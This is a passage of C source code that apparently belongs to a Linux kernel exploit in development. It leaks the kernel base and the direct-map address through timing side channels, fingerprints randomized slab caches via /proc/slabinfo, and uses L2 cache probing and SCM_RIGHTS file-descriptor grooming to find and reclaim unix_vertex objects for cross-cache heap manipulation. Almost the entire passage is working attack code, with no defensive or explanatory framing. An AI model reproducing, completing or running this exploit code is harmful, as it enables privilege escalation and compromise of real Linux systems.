	for (int dc = 0; dc < drain96_count; dc++)
		close(drain96_fds[dc]);
	close(flags_fd);
	fail("unix_vertex allocation did not reclaim packet anchor");
}

static int anchored_vertex_fd(const struct anchored_vertex *vertex)
{
	return vertex->candidate_pairs[vertex->target_index][0];
}

static int anchored_vertex_peer(const struct anchored_vertex *vertex)
{
	return vertex->candidate_pairs[vertex->target_index][1];
}

static __attribute__((unused)) void replace_anchored_vertex(
				    struct anchored_vertex *vertex,
				    bool listener_candidate)
{
	int replacement_holder[2];
	int replacement[2] = {-1, -1};
	size_t remaining;
	size_t index;

	if (make_unix_socketpair(replacement_holder) != 0)
		die("socketpair anchored replacement holder");
	if (listener_candidate) {
		replacement[0] = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (replacement[0] < 0)
			die("socket anchored replacement listener");
	} else if (make_unix_socketpair(replacement) != 0) {
		die("socketpair anchored replacement");
	}

	remaining = vertex->queued_count - (vertex->target_index + 1);
	pin_to_cpu(0);
	for (index = 0; index <= vertex->target_index; index++)
		recv_and_close_fds(vertex->holder[1], 1);
	if (send_one_fd_stack(replacement_holder[0], replacement[0], 'R') != 0)
		die("sendmsg anchored replacement");
	pin_to_cpu(1);
	for (index = 0; index < remaining; index++)
		recv_and_close_fds(vertex->holder[1], 1);
	close(vertex->holder[0]);
	close(vertex->holder[1]);

	vertex->holder[0] = replacement_holder[0];
	vertex->holder[1] = replacement_holder[1];
	vertex->candidate_pairs[0][0] = replacement[0];
	vertex->candidate_pairs[0][1] = replacement[1];
	vertex->target_index = 0;
	vertex->queued_count = 1;
	vertex->filler_count = 0;
	pin_to_cpu(0);
}

static void drain_anchored_vertex_messages(struct anchored_vertex *vertex)
{
	size_t index;

	for (index = 0; index < vertex->queued_count; index++)
		recv_and_close_fds(vertex->holder[1], 1);
	close(vertex->holder[0]);
	close(vertex->holder[1]);
	vertex->holder[0] = -1;
	vertex->holder[1] = -1;
}

static int replace_vertex_with_b(int candidate_pair[2],
				 size_t target_index)
{
	int b_holder[2];
	int b_fd;
	size_t index;

	if (make_unix_socketpair(b_holder) != 0)
		die("socketpair replacement B");
	b_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (b_fd < 0)
		die("socket replacement B");

	pin_to_cpu(0);
	for (index = 0; index <= target_index; index++)
		recv_and_close_fds(candidate_pair[1], 1);
	if (send_one_fd_stack(b_holder[0], b_fd, 'B') != 0)
		die("sendmsg replacement B");
	return b_fd;
}

static void detect_l2_geometry(struct cache_geometry *geometry)
{
	uint32_t eax;
	uint32_t ebx;
	uint32_t ecx;
	uint32_t edx;
	uint32_t subleaf;

	for (subleaf = 0; subleaf < 16; subleaf++) {
		eax = 4;
		ecx = subleaf;
		asm volatile("cpuid"
			     : "+a"(eax), "=b"(ebx), "+c"(ecx), "=d"(edx));
		if (!(eax & 0x1f))
			break;
		if (((eax >> 5) & 0x7) != 2 ||
		    ((eax & 0x1f) != 1 && (eax & 0x1f) != 3))
			continue;
		geometry->line_size = (ebx & 0xfff) + 1;
		geometry->ways = ((ebx >> 22) & 0x3ff) + 1;
		geometry->sets = ecx + 1;
		if (geometry->line_size != L1_CACHE_LINE ||
		    geometry->ways > ARRAY_SIZE(
			    ((struct cache_probe_set *)0)->way))
			fail("unsupported L2 cache geometry");
		return;
	}
	fail("could not enumerate the L2 cache");
}

static inline uint64_t oracle_rdtsc_begin(void)
{
	uint32_t high;
	uint32_t low;

	asm volatile("mfence\n\t"
		     "lfence\n\t"
		     "rdtsc\n\t"
		     : "=a"(low), "=d"(high)
		     :
		     : "memory");
	return ((uint64_t)high << 32) | low;
}

static inline uint64_t oracle_rdtsc_end(void)
{
	uint32_t high;
	uint32_t low;

	asm volatile("rdtscp\n\t"
		     "lfence\n\t"
		     : "=a"(low), "=d"(high)
		     :
		     : "rcx", "memory");
	return ((uint64_t)high << 32) | low;
}

static void build_l2_probe_sets(
	const struct packet_page_anchor *slab,
	const struct packet_page_anchor *eviction,
	const struct cache_geometry *geometry,
	struct cache_probe_set probes[L1_SET_COUNT])
{
	uint64_t slab_physical = slab->pfn * KERNEL_PAGE_SIZE;
	uint64_t eviction_physical = eviction->pfn * KERNEL_PAGE_SIZE;
	size_t line;

	memset(probes, 0, sizeof(*probes) * L1_SET_COUNT);
	for (line = 0; line < L1_SET_COUNT; line++) {
		size_t target_set =
			((slab_physical / geometry->line_size) + line) %
			geometry->sets;
		size_t found = 0;
		size_t offset;

		for (offset = 0;
		     offset < eviction->length && found < geometry->ways;
		     offset += geometry->line_size) {
			size_t set =
				((eviction_physical + offset) /
				 geometry->line_size) %
				geometry->sets;

			if (set != target_set)
				continue;
			probes[line].way[found++] =
				eviction->mapping + offset;
		}
		if (found != geometry->ways) {
			printf("[-] L2 set %zu found %zu/%zu congruent lines"
			       " in %zu bytes (sets=%zu)\n",
			       target_set, found, geometry->ways,
			       eviction->length, geometry->sets);
			fail("packet block lacks enough L2-congruent lines");
		}
	}
}

static uint64_t probe_l2_line(const struct cache_probe_set *probe,
			      size_t ways)
{
	unsigned int sink = oracle_cache_sink;
	uint64_t started = oracle_rdtsc_begin();
	size_t way;

	for (way = 0; way < ways; way++)
		sink += *probe->way[way];
	started = oracle_rdtsc_end() - started;
	oracle_cache_sink = sink;
	return started;
}

static void queue_vertex_probe_messages(int pair[2], int target_fd,
					int control_fd)
{
	int trial;

	for (trial = 0; trial < ORACLE_L1_TRIALS; trial++) {
		int fd = (trial & 1) ? control_fd : target_fd;

		if (send_one_fd_stack(pair[0], fd, 'P') != 0)
			die("queue L2 vertex probe");
	}
}

static void drop_vertex_probe_message(int receiver)
{
	char byte;

	if (recv(receiver, &byte, sizeof(byte), 0) != 1)
		die("drop L2 vertex probe");
}

static uint64_t localize_vertex_slot(
				     const struct packet_page_anchor *slab,
				     const struct packet_page_anchor *eviction,
				     int target_fd, int control_fd,
				     size_t objects_per_slab)
{
	uint64_t target_sum[L1_SET_COUNT] = {0};
	uint64_t control_sum[L1_SET_COUNT] = {0};
	uint64_t target_samples[ORACLE_L1_TRIALS / 2];
	uint64_t control_samples[ORACLE_L1_TRIALS / 2];
	int64_t delta[L1_SET_COUNT];
	int64_t object_scores[42] = {0};
	struct cache_probe_set probes[L1_SET_COUNT];
	struct cache_geometry geometry;
	int64_t best_score = INT64_MIN;
	size_t best_slot = 0;
	int probe_pair[2];
	size_t slot;
	int trial;

	if (!objects_per_slab || objects_per_slab > 42)
		fail("unexpected 96-byte slab geometry");
	detect_l2_geometry(&geometry);
	build_l2_probe_sets(slab, eviction, &geometry, probes);
	if (make_unix_socketpair(probe_pair) != 0)
		die("socketpair L2 vertex probe");
	{
		int send_buffer = LARGE_SNDBUF;

		if (setsockopt(probe_pair[0], SOL_SOCKET, SO_SNDBUF,
			       &send_buffer, sizeof(send_buffer)) != 0)
			die("SO_SNDBUF L2 vertex probe");
	}

	for (slot = 0; slot < L1_SET_COUNT; slot++) {
		size_t target_count = 0;
		size_t control_count = 0;

		queue_vertex_probe_messages(
			probe_pair, target_fd, control_fd);
		for (trial = 0; trial < ORACLE_L1_TRIALS; trial++) {
			unsigned int sink = oracle_cache_sink;
			bool target = (trial & 1) == 0;
			size_t way;

			/* Probe one set per operation.  Priming the whole L1 let the
			 * common sendmsg working set hide the one target-only line.
			 */
			for (way = geometry.ways; way-- > 0;)
				sink += *probes[slot].way[way];
			oracle_cache_sink = sink;
			drop_vertex_probe_message(probe_pair[1]);
			if (target)
				target_samples[target_count++] = probe_l2_line(
					&probes[slot], geometry.ways);
			else
				control_samples[control_count++] = probe_l2_line(
					&probes[slot], geometry.ways);
		}
		target_sum[slot] = oracle_trimmed_mean(
			target_samples, target_count);
		control_sum[slot] = oracle_trimmed_mean(
			control_samples, control_count);
		delta[slot] = (int64_t)target_sum[slot] -
			(int64_t)control_sum[slot];
	}
	for (slot = 0; slot < objects_per_slab; slot++) {
		size_t object_offset = slot * 96;
		size_t first_set =
			(object_offset / L1_CACHE_LINE) % L1_SET_COUNT;
		size_t out_degree_set =
			((object_offset + UNIX_VERTEX_OUT_DEGREE_OFFSET) /
			 L1_CACHE_LINE) %
			L1_SET_COUNT;
		/* out_degree is modified on every probe and names one unique
		 * cache line for every possible 96-byte object in the page.
		 */
		int64_t score = 2 * delta[out_degree_set];

		if (first_set != out_degree_set)
			score += delta[first_set];
		object_scores[slot] = score;
		if (score > best_score) {
			best_score = score;
			best_slot = slot;
		}
	}
	{
		bool used[42] = {0};
		size_t rank;

		for (rank = 0; rank < ARRAY_SIZE(oracle_last_top); rank++) {
			size_t selected = 0;

			while (selected < objects_per_slab && used[selected])
				selected++;
			for (slot = selected + 1; slot < objects_per_slab; slot++) {
				if (!used[slot] &&
				    object_scores[slot] > object_scores[selected])
					selected = slot;
			}
			oracle_last_top[rank] = selected;
			used[selected] = true;
		}
	}
	return slab->direct_map_address + best_slot * 96;
}

static uint64_t validate_vertex_slot(
	const struct packet_page_anchor *slab,
	const struct packet_page_anchor *eviction,
	int target_fd, int control_fd, size_t objects_per_slab,
	size_t expected_slot)
{
	enum { TRIALS = 800 };
	uint64_t target[42][TRIALS / 2];
	uint64_t control[42][TRIALS / 2];
	size_t target_count = 0;
	size_t control_count = 0;
	struct cache_probe_set probes[L1_SET_COUNT];
	struct cache_geometry geometry;
	int64_t best_delta = INT64_MIN;
	int64_t second_delta = INT64_MIN;
	size_t best_slot = 0;
	int probe_pair[2];
	size_t slot;
	size_t trial;

	detect_l2_geometry(&geometry);
	build_l2_probe_sets(slab, eviction, &geometry, probes);
	if (make_unix_socketpair(probe_pair) != 0)
		die("socketpair focused vertex probe");
	{
		int send_buffer = LARGE_SNDBUF;

		if (setsockopt(probe_pair[0], SOL_SOCKET, SO_SNDBUF,
			       &send_buffer, sizeof(send_buffer)) != 0)
			die("SO_SNDBUF focused vertex probe");
	}
	{
		enum { BATCH = 200 };
		size_t base;

		for (base = 0; base < TRIALS; base += BATCH) {
			size_t end = base + BATCH;
			if (end > TRIALS)
				end = TRIALS;
			for (trial = base; trial < end; trial++) {
				int fd = (trial & 1) ? control_fd : target_fd;

				if (send_one_fd_stack(probe_pair[0], fd, 'V') != 0)
					die("queue focused vertex probe");
			}
			for (trial = base; trial < end; trial++) {
				unsigned int sink = oracle_cache_sink;
				bool is_target = (trial & 1) == 0;
				size_t sample = is_target ? target_count++ :
							    control_count++;

				for (slot = 0; slot < objects_per_slab; slot++) {
					size_t offset = slot * 96 +
						UNIX_VERTEX_OUT_DEGREE_OFFSET;
					size_t set = (offset / L1_CACHE_LINE) %
						L1_SET_COUNT;
					size_t way;

					for (way = geometry.ways; way-- > 0;)
						sink += *probes[set].way[way];
				}
				oracle_cache_sink = sink;
				drop_vertex_probe_message(probe_pair[1]);
				for (slot = 0; slot < objects_per_slab; slot++) {
					size_t offset = slot * 96 +
						UNIX_VERTEX_OUT_DEGREE_OFFSET;
					size_t set = (offset / L1_CACHE_LINE) %
						L1_SET_COUNT;
					uint64_t elapsed = probe_l2_line(
						&probes[set], geometry.ways);

					(is_target ? target[slot] :
						     control[slot])[sample] =
						elapsed;
				}
			}
		}
	}
	for (slot = 0; slot < objects_per_slab; slot++) {
		int64_t delta = (int64_t)oracle_trimmed_mean(
			target[slot], target_count) -
			(int64_t)oracle_trimmed_mean(
				control[slot], control_count);

		if (delta > best_delta) {
			second_delta = best_delta;
			best_delta = delta;
			best_slot = slot;
		} else if (delta > second_delta) {
			second_delta = delta;
		}
	}
	close(probe_pair[0]);
	close(probe_pair[1]);
	if (best_delta < 8 || best_delta < second_delta + 4 ||
	    best_slot != expected_slot) {
		printf("[W] focused probe: best_slot=%zu expected=%zu "
		       "delta=%lld 2nd=%lld — using vote winner\n",
		       best_slot, expected_slot,
		       (long long)best_delta, (long long)second_delta);
		fflush(stdout);
		return slab->direct_map_address + expected_slot * 96;
	}
	return slab->direct_map_address + best_slot * 96;
}

static __attribute__((unused)) uint64_t localize_replaced_vertex(
	struct anchored_vertex *vertex, bool listener_candidate,
	const struct packet_page_anchor *slab,
	const struct packet_page_anchor *eviction,
	int control_fd, size_t objects_per_slab)
{
	unsigned int after_votes[42];
	unsigned int after_primary[42];
	unsigned int best_votes;
	unsigned int second_votes;
	unsigned int best_primary;
	size_t best_slot;
	size_t pass;
	size_t rank;
	size_t slot;
	int retry;

	(void)listener_candidate;
	for (retry = 0; retry < 3; retry++) {
		memset(after_votes, 0, sizeof(after_votes));
		memset(after_primary, 0, sizeof(after_primary));
		best_votes = 0;
		second_votes = 0;
		best_primary = 0;
		best_slot = 0;

		for (pass = 0; pass < 12; pass++) {
			printf("[D] localize pass %zu/12 (try %d)\n",
			       pass + 1, retry + 1);
			fflush(stdout);
			(void)localize_vertex_slot(slab, eviction,
				anchored_vertex_fd(vertex), control_fd,
				objects_per_slab);
			after_primary[oracle_last_top[0]]++;
			for (rank = 0; rank < ARRAY_SIZE(oracle_last_top);
			     rank++)
				after_votes[oracle_last_top[rank]] +=
					(unsigned int)(
						ARRAY_SIZE(oracle_last_top) -
						rank);
		}
		for (slot = 0; slot < objects_per_slab; slot++) {
			if (after_votes[slot] > best_votes ||
			    (after_votes[slot] == best_votes &&
			     after_primary[slot] > best_primary)) {
				second_votes = best_votes;
				best_primary = after_primary[slot];
				best_votes = after_votes[slot];
				best_slot = slot;
			} else if (after_votes[slot] > second_votes) {
				second_votes = after_votes[slot];
			}
		}
		printf("[D] oracle vote: best=%u 2nd=%u slot=%zu "
		       "(need %u/%u)\n", best_votes, second_votes,
		       best_slot, 20u, second_votes + 6);
		fflush(stdout);
		if (best_votes >= 20 && best_votes >= second_votes + 6)
			return validate_vertex_slot(slab, eviction,
				anchored_vertex_fd(vertex), control_fd,
				objects_per_slab, best_slot);
		printf("[W] oracle retry %d/3 — votes too noisy\n",
		       retry + 1);
		fflush(stdout);
		sleep_usec(50000);
	}
	printf("[W] oracle exhausted — using best-effort slot %zu "
	       "(best=%u 2nd=%u)\n", best_slot, best_votes, second_votes);
	fflush(stdout);
	return slab->direct_map_address + best_slot * 96;
}

static uint64_t median_small(const uint64_t *values, size_t count)
{
	uint64_t sorted[16];
	size_t index;

	if (!count || count > ARRAY_SIZE(sorted))
		return UINT64_MAX;
	memcpy(sorted, values, count * sizeof(sorted[0]));
	for (index = 1; index < count; index++) {
		uint64_t value = sorted[index];
		size_t position = index;

		while (position && sorted[position - 1] > value) {
			sorted[position] = sorted[position - 1];
			position--;
		}
		sorted[position] = value;
	}
	return sorted[count / 2];
}

static int compare_oracle_u64(const void *left, const void *right)
{
	uint64_t a = *(const uint64_t *)left;
	uint64_t b = *(const uint64_t *)right;

	return (a > b) - (a < b);
}

static uint64_t oracle_trimmed_mean(uint64_t *values, size_t count)
{
	unsigned __int128 sum = 0;
	size_t trim = count / 8;
	size_t index;

	qsort(values, count, sizeof(*values), compare_oracle_u64);
	for (index = trim; index < count - trim; index++)
		sum += values[index];
	return (uint64_t)(sum / (count - 2 * trim));
}

static uint64_t refine_direct_map_base(uint64_t leaked_window, uint64_t pfn,
				       volatile unsigned char *user_mapping)
{
	enum {
		RADIUS = 4,
		CANDIDATE_COUNT = RADIUS * 2 + 1,
		CALIB_SAMPLES = 127,
		ROUNDS = 31,
	};
	uint64_t physical = pfn * KERNEL_PAGE_SIZE;
	int votes[CANDIDATE_COUNT];
	int round, delta, best_delta = 0, best_votes = 0;
	int second_votes = 0;

	memset(votes, 0, sizeof(votes));
	for (round = 0; round < ROUNDS; round++) {
		uint64_t best_sep = 0;
		int round_best = 0;

		for (delta = -RADIUS; delta <= RADIUS; delta++) {
			uint64_t dm_addr = leaked_window +
				(int64_t)delta * (int64_t)GIB + physical;
			uint64_t ct, ut, sep;

			if (xdk_calibrate_prefetch_cache(
				    user_mapping, dm_addr, CALIB_SAMPLES,
				    &ct, &ut) != 0)
				continue;
			sep = ut > ct ? ut - ct : 0;
			if (sep > best_sep) {
				best_sep = sep;
				round_best = delta;
			}
		}
		if (best_sep >= 2)
			votes[round_best + RADIUS]++;
	}
	for (delta = 0; delta < CANDIDATE_COUNT; delta++) {
		if (votes[delta] > best_votes) {
			second_votes = best_votes;
			best_votes = votes[delta];
			best_delta = delta - RADIUS;
		} else if (votes[delta] > second_votes) {
			second_votes = votes[delta];
		}
	}
	printf("[D] dm votes:");
	for (delta = -RADIUS; delta <= RADIUS; delta++)
		printf(" %+d:%d", delta, votes[delta + RADIUS]);
	printf("\n");
	if (best_votes < 4 || best_votes <= second_votes + 1)
		fail("direct-map refinement: no cache-validation consensus");
	printf("[+] direct-map refinement: delta=%d votes=%d/%d (2nd=%d)\n",
	       best_delta, best_votes, ROUNDS, second_votes);
	return leaked_window + (int64_t)best_delta * (int64_t)GIB;
}

static int run_oracle_mode(bool run_vertex_oracle)
{
	struct rnd96_counts before;
	struct rnd96_counts after;
	struct packet_page_anchor anchor;
	struct packet_page_anchor eviction;
	struct cache_geometry l2_geometry;
	int vertex_holder[2];
	int vertex_fds[ORACLE_BATCH];
	int address_fds[ORACLE_BATCH];
	int candidate_pair[2];
	int control_fd;
	int target_fd;
	int b_fd;
	uint64_t kernel_base;
	uint64_t direct_map_base;
	uint64_t cached_prefetch;
	uint64_t uncached_prefetch;
	uint64_t target_vertex;
	uint64_t b_vertex;
	uint64_t vertex_a;
	uint64_t vertex_b;
	size_t eviction_length;
	size_t target_index;
	int vertex_cache;
	int address_cache;
	int classify_round;

	timing_started = monotonic_nsec();
	printf("[*] oracle: leaking kernel text base\n");
	kernel_base = leak_xdk_kaslr_base();
	if (!kernel_base)
		fail("kernelXDK KASLR leak did not reach a majority");
	printf("[+] oracle: kernel base 0x%016llx (BEFORE override)\n",
	       (unsigned long long)kernel_base);
#ifdef KBASE_OVERRIDE
	kernel_base = KBASE_OVERRIDE;
	printf("[!] oracle: kernel_base OVERRIDDEN to 0x%016llx\n",
	       (unsigned long long)kernel_base);
#endif
	printf("[+] oracle: kernel base 0x%016llx\n",
	       (unsigned long long)kernel_base);

	printf("[*] oracle: leaking direct-map window\n");
	direct_map_base = xdk_leak_direct_map_base(
		3, DIRECT_MAP_LEAK_SAMPLE_COUNT,
		DIRECT_MAP_LEAK_TRIAL_COUNT);
	if (!direct_map_base)
		fail("kernelXDK direct-map leak did not reach a majority");
	printf("[+] oracle: direct-map window 0x%016llx\n",
	       (unsigned long long)direct_map_base);

	printf("[*] oracle: allocating an order-0 GFP_KERNEL page anchor\n");
	create_packet_page_anchor(&anchor, KERNEL_PAGE_SIZE);
	printf("[+] oracle: packet page PFN 0x%llx\n",
	       (unsigned long long)anchor.pfn);
	direct_map_base = refine_direct_map_base(
		direct_map_base, anchor.pfn, anchor.mapping);
	printf("[+] oracle: refined direct-map base 0x%016llx (BEFORE override)\n",
	       (unsigned long long)direct_map_base);
#ifdef DM_BASE_OVERRIDE
	direct_map_base = DM_BASE_OVERRIDE;
	printf("[!] oracle: dm_base OVERRIDDEN to 0x%016llx\n",
	       (unsigned long long)direct_map_base);
#endif
	anchor.direct_map_address =
		direct_map_base + anchor.pfn * KERNEL_PAGE_SIZE;
	printf("[+] oracle: refined direct-map base 0x%016llx\n",
	       (unsigned long long)direct_map_base);
	printf("[+] oracle: exact packet page address 0x%016llx\n",
	       (unsigned long long)anchor.direct_map_address);
	detect_l2_geometry(&l2_geometry);
	eviction_length = 2 * l2_geometry.ways * l2_geometry.sets *
		l2_geometry.line_size;
	if (xdk_calibrate_prefetch_cache(
		    anchor.mapping, anchor.direct_map_address, 127,
		    &cached_prefetch, &uncached_prefetch) != 0)
		fail("could not calibrate direct-map cache timing");
	printf("[O] direct-map cache timing cached=%llu uncached=%llu\n",
	       (unsigned long long)cached_prefetch,
	       (unsigned long long)uncached_prefetch);

	if (read_rnd96_counts(&before) != 0)
		die("open /proc/slabinfo");
	vertex_cache = -1;
	for (classify_round = 0; classify_round < 64; classify_round++) {
		if (!classify_round) {
			oracle_hold_vertices(vertex_holder, vertex_fds);
			control_fd = vertex_fds[0];
		} else {
			oracle_add_vertices(vertex_holder[0], vertex_fds);
		}
		if (read_rnd96_counts(&after) != 0)
			die("open /proc/slabinfo");
		vertex_cache = rnd96_delta(&before, &after);
		if (vertex_cache >= 0)
			break;
		before = after;
	}
	if (vertex_cache < 0)
		fail("could not classify the unix_vertex randomized cache");
	if (run_vertex_oracle) {
		detect_l2_geometry(&l2_geometry);
		eviction_length = l2_geometry.ways *
			l2_geometry.sets * l2_geometry.line_size;
		printf("[*] oracle: L2 geometry ways=%zu sets=%zu line=%zu;"
		       " allocating %zu MiB eviction block\n",
		       l2_geometry.ways, l2_geometry.sets,
		       l2_geometry.line_size, eviction_length / MIB);
		create_packet_page_anchor(&eviction, eviction_length);
		eviction.direct_map_address =
			direct_map_base + eviction.pfn * KERNEL_PAGE_SIZE;
		printf("[+] oracle: L2 eviction block PFN 0x%llx"
		       " address 0x%016llx\n",
		       (unsigned long long)eviction.pfn,
		       (unsigned long long)eviction.direct_map_address);
		target_fd = handoff_anchor_to_vertex(
			&anchor, vertex_cache, candidate_pair,
			&target_index);
		target_vertex = localize_vertex_slot(
			&anchor, &eviction, target_fd, control_fd,
			after.objects_per_slab[vertex_cache]);
		printf("[+] oracle: exact anchored vertex address"
		       " 0x%016llx\n",
		       (unsigned long long)target_vertex);
		b_fd = replace_vertex_with_b(candidate_pair, target_index);
		b_vertex = localize_vertex_slot(
			&anchor, &eviction, b_fd, control_fd,
			after.objects_per_slab[vertex_cache]);
		if (b_vertex != target_vertex)
			fail("same-callsite B did not reuse the localized Vb slot");
		printf("[+] oracle: same-callsite handoff confirmed B == Vb"
		       " == 0x%016llx\n", (unsigned long long)b_vertex);
	}

	/*
	 * These values are layout sentinels only. No kernel path dereferences
	 * address-name bytes while the object remains a unix_address.
	 */
	vertex_a = direct_map_base + 0x1000;
	vertex_b = direct_map_base + 0x1060;
	if (read_rnd96_counts(&before) != 0)
		die("open /proc/slabinfo");
	address_cache = -1;
	for (classify_round = 0; classify_round < 64; classify_round++) {
		oracle_hold_addresses(
			address_fds, vertex_a, vertex_b,
			(uint64_t)classify_round * ORACLE_BATCH);
		verify_address_round_trip(
			address_fds[0], vertex_a, vertex_b);
		if (read_rnd96_counts(&after) != 0)
			die("open /proc/slabinfo");
		address_cache = rnd96_delta(&before, &after);
		if (address_cache >= 0)
			break;
		before = after;
	}
	if (address_cache < 0)
		fail("could not classify the unix_address randomized cache");

	printf("[+] oracle: 88-byte A/B reclaim template round-trips intact\n");
	printf("[+] oracle: vertex cache=%02d address cache=%02d\n",
	       vertex_cache, address_cache);
	if (vertex_cache == address_cache)
		printf("[+] oracle: direct same-cache reclaim is available this boot\n");
	else
		printf("[+] oracle: cross-cache slab-page reclaim is required\n");
	if (run_vertex_oracle) {
		printf("[+] oracle: exact Vb localization and B handoff"
		       " are implemented\n");
		printf("[!] oracle: live-A slab isolation is the next"
		       " unimplemented gate\n");
	} else {
		printf("[*] oracle: run --vertex-oracle for the experimental"
		       " exact Vb/B gate\n");
	}
	return 0;
}

static void *vertex_prefill_worker(void *arg)
{
	struct vertex_prefill_worker *worker = arg;
	uid_t uid = VERTEX_PREFILL_UID_BASE +
		worker->gate->cpu * VERTEX_PREFILL_WORKERS_PER_CPU +
		worker->id;

	pin_to_cpu(worker->gate->cpu);
	if (syscall(SYS_setresuid, uid, 0, 0) != 0)
		die("setresuid vertex prefill");
	atomic_store_explicit(&worker->ready, 1, memory_order_release);
	futex_wait_zero(&worker->gate->go);
	worker->ret = send_fds(worker->sock[0], worker->predecessors,
			       ARRAY_SIZE(worker->predecessors), 'v');
	worker->err = worker->ret < 0 ? errno : 0;
	atomic_store_explicit(&worker->done, 1, memory_order_release);
	return NULL;
}

static struct vertex_prefill_gate *prepare_vertex_prefill(int cpu)
{
	struct vertex_prefill_gate *gate;
	size_t worker_i;

	gate = calloc(1, sizeof(*gate));
	if (!gate)
		die("calloc vertex prefill");
	atomic_init(&gate->go, 0);
	gate->cpu = cpu;

	for (worker_i = 0; worker_i < ARRAY_SIZE(gate->workers); worker_i++) {
		struct vertex_prefill_worker *worker = &gate->workers[worker_i];
		size_t fd_i;

		worker->gate = gate;
		worker->id = worker_i;
		for (fd_i = 0; fd_i < ARRAY_SIZE(worker->predecessors); fd_i++) {
			worker->predecessors[fd_i] = socket(
				AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
			if (worker->predecessors[fd_i] < 0)
				die("socket vertex prefill predecessor");
		}
		if (make_unix_socketpair(worker->sock) != 0)
			die("socketpair vertex prefill");
		atomic_init(&worker->ready, 0);
		atomic_init(&worker->done, 0);
		if (pthread_create(&worker->thread, NULL,
				   vertex_prefill_worker, worker) != 0)
			die("pthread_create vertex prefill");
		while (!atomic_load_explicit(&worker->ready,
					     memory_order_acquire))
			sched_yield();
	}
	return gate;
}

static void publish_vertex_prefill(struct vertex_prefill_gate *gate)
{
	size_t worker_i;

	futex_set(&gate->go);
	for (worker_i = 0; worker_i < ARRAY_SIZE(gate->workers); worker_i++) {
		struct vertex_prefill_worker *worker = &gate->workers[worker_i];

		while (!atomic_load_explicit(&worker->done,
					     memory_order_acquire))
			sched_yield();
		if (worker->ret != 0) {
			errno = worker->err;
			die("publish vertex prefill");
		}
		if (pthread_join(worker->thread, NULL) != 0)
			die("pthread_join vertex prefill");
	}
}

static void drain_vertex_prefill(struct vertex_prefill_gate *gate)
{
	size_t worker_i;

	for (worker_i = 0; worker_i < ARRAY_SIZE(gate->workers); worker_i++) {
		struct vertex_prefill_worker *worker = &gate->workers[worker_i];
		size_t fd_i;

		recv_and_close_fds(worker->sock[1], SCM_FD_COUNT);
		close(worker->sock[0]);
		close(worker->sock[1]);
		for (fd_i = 0; fd_i < ARRAY_SIZE(worker->predecessors); fd_i++)
			close(worker->predecessors[fd_i]);
	}
}

static void snapshot_rnd96(const char *label)
{
	unsigned long active;
	unsigned long total;
	char name[64];
	char line[512];
	FILE *file;

	file = fopen("/proc/slabinfo", "re");
	if (!file)
		die("open /proc/slabinfo");
	while (fgets(line, sizeof(line), file)) {
		if (sscanf(line, "%63s %lu %lu", name, &active, &total) != 3)
			continue;
		if (strncmp(name, "kmalloc-rnd-", strlen("kmalloc-rnd-")) != 0)
			continue;
		if (strcmp(name + strlen(name) - 3, "-96") != 0)
			continue;
		printf("[S] %-24s %-20s active=%lu total=%lu\n",
		       label, name, active, total);
	}
	fclose(file);
}

static int run_slab_debug_mode(void)
{
	struct rnd96_counts before;
	struct rnd96_counts after;
	int holder[2];
	int fds[ORACLE_BATCH];
	int index;
	int status;
	pid_t pid;

	pid = fork();
	if (pid < 0)
		die("fork slab debug");
	if (pid > 0) {
		if (waitpid(pid, &status, 0) != pid)
			die("waitpid slab debug");
		return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
	}

	if (read_rnd96_counts(&before) != 0)
		die("debug read slabinfo before");
	snapshot_rnd96("debug-before");
	oracle_hold_vertices(holder, fds);
	if (read_rnd96_counts(&after) != 0)
		die("debug read slabinfo after");
	snapshot_rnd96("debug-after");
	for (index = 0; index < RND_CACHE_COUNT; index++) {
		if (!before.total[index] && !after.total[index])
			continue;
		printf("[D] cache=%02d active=%lu->%lu total=%lu->%lu"
		       " objects=%lu pages=%lu\n",
		       index, before.active[index], after.active[index],
		       before.total[index], after.total[index],
		       after.objects_per_slab[index],
		       after.pages_per_slab[index]);
	}
	return 0;
}

static void recv_and_close_fds(int sock, size_t expected)
{
	unsigned char control[CMSG_SPACE(sizeof(int) * SCM_FD_COUNT)] = {0};
	struct iovec iov;
	struct msghdr msg = {0};
	struct cmsghdr *cmsg;
	char byte;
	size_t received = 0;
	ssize_t ret;

	iov.iov_base = &byte;
	iov.iov_len = sizeof(byte);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = sizeof(control);

	ret = recvmsg(sock, &msg, MSG_CMSG_CLOEXEC);
	if (ret != 1)
		die("recvmsg filler batch");
	if (msg.msg_flags & (MSG_CTRUNC | MSG_TRUNC))
		fail("filler batch was truncated");

	for (cmsg = CMSG_FIRSTHDR(&msg); cmsg;
	     cmsg = CMSG_NXTHDR(&msg, cmsg)) {
		int *fds;
		size_t count;
		size_t i;

		if (cmsg->cmsg_level != SOL_SOCKET ||
		    cmsg->cmsg_type != SCM_RIGHTS)
			continue;
		fds = (int *)CMSG_DATA(cmsg);
		count = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(*fds);
		for (i = 0; i < count; i++)
			close(fds[i]);
		received += count;
	}
	if (received != expected)
		fail("filler batch returned the wrong fd count");
}

static int send_repeated_fd(int sock, int fd, size_t count, char byte)
{
	int fds[SCM_FD_COUNT];
	size_t i;

	for (i = 0; i < count; i++)
		fds[i] = fd;
	return send_fds(sock, fds, count, byte);
}

static int fill_sender_wmem(int sock)
{
	char data[512];
	int sndbuf = SMALL_SNDBUF;

	memset(data, 'F', sizeof(data));
	if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf,
		       sizeof(sndbuf)) != 0)
		return -1;

	for (;;) {
		ssize_t ret = send(sock, data, sizeof(data),
				   MSG_DONTWAIT | MSG_NOSIGNAL);

		if (ret > 0)
			continue;
		if (ret < 0 && errno == EINTR)
			continue;
		if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
			return 0;
		return -1;
	}
}

static int read_wchan(pid_t tid, char *buf, size_t size)
{
	char path[128];
	ssize_t len;
	int fd;

	snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	len = read(fd, buf, size - 1);
	close(fd);
	if (len <= 0)
		return -1;
	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r'))
